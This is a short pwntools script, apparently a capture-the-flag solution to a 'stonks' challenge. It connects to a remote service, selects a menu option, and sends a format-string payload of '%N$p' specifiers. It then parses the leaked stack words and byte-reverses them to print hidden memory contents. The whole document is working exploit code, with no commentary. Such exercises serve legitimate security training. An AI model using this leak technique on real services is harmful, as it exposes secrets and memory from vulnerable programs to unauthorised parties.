from pwn import *

PARAM_START = 15
PARAM_END = 25

dumper = b'.'.join([f"%{x}$p".encode('latin1') for x in range(PARAM_START, PARAM_END+1)])

io = remote(args.HOST, args.PORT)

io.sendline(b"1")
io.sendline(dumper)

io.readuntil(b"Buying stonks with token:\n")
chunks = io.readline().strip().decode('latin1').split('.')
decoded = b''.join([bytes.fromhex(x[2:])[::-1] for x in chunks])
log.success(decoded.decode('latin1'))

